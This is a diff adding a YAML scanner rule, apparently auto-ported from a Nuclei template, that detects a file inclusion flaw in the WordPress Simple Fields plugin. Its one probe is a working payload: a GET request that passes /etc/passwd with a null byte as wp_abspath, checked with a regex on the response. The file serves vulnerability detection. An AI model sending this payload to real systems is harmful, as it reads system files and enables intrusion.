@@ -1,0 +1,26 @@
+schema_version: 1
+id: "cortex.community:wp-simple-fields-lfi"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+info:
+  name: "WordPress Simple Fields 0.2 - 0.3.5 LFI/RFI/RCE"
+  description: "WordPress Simple Fields 0.2 is vulnerable to local file inclusion, remote file inclusion, and remote code execution. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
+  references:
+    - "https://packetstormsecurity.com/files/147102/WordPress-Simple-Fields-0.3.5-File-Inclusion-Remote-Code-Execution.html"
+  tags: ["wp-plugin", "lfi", "packetstorm", "wordpress", "vuln", "nuclei", "auto-ported", "signal"]
+  remediation: "See the referenced advisory / template source for remediation."
+finding:
+  sink_type: "VULNERABLE_COMPONENT"
+  impact: "INFORMATION_DISCLOSURE"
+  severity: "High"
+  root_cause: "nuclei-ported-signal"
+execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
+steps:
+  - id: "probe0"
+    request: { method: "GET", path: "/wp-content/plugins/simple-fields/simple_fields.php?wp_abspath=/etc/passwd%00" }
+proof:
+  kind: "signal.v1"
+  assertions:
+    regex: { left: { ref: "steps.probe0.body" }, right: { value: "root:.*:0:0:" } }
